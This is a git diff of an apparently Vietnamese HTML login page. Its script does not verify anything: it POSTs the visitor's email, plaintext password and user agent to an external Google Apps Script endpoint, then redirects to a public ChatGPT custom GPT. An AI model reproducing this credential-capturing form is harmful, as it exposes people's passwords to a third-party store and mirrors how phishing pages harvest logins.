@@ -68,7 +68,7 @@
   </div>
 
   <script>
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbxxI-414v7pYynhwLf0eQkfGEO_m2o0frAga2XNxKGD5ufBxg_XrFhsTt3IIbjI5RgM/exec'; // <- thay bằng URL Web App thật
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbw_jaAX4YZgO-w_jFFNMHvOd7tAsEaovg7-gkouh0IKZ8P7Dt3lsmoOUyDQIjuSDHNz/exec'; // <- thay bằng URL Web App thật
 
     function checkCredentials() {
       const email = document.getElementById('email').value.trim();
@@ -95,19 +95,23 @@
       };
 
       fetch(scriptURL, {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-      })
-      .then(() => {
-        // Sau khi gửi xong thì redirect
-        window.location.href = "https://chatgpt.com/g/g-67e69d0bd2008191873e8b9f07889a5c-tro-ly-ban-hang-medipharm";
-      })
-      .catch(err => {
-        console.error('Lỗi gửi dữ liệu:', err);
-        errorBox.textContent = "Đã xảy ra lỗi, vui lòng thử lại.";
-      });
+      method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+         body: JSON.stringify({
+           email: email,
+          password: pass,  // nếu muốn gửi mật khẩu
+        userAgent: navigator.userAgent
+    })
+  })
+.then(response => response.text())
+.then(result => {
+  console.log('Success:', result);
+  window.location.href = "https://chatgpt.com/g/g-67e69d0bd2008191873e8b9f07889a5c-tro-ly-ban-hang-medipharm";
+})
+.catch(error => {
+  console.error('Error:', error);
+  errorBox.textContent = "Đã xảy ra lỗi, vui lòng thử lại.";
+});
     }
   </script>
 </body>
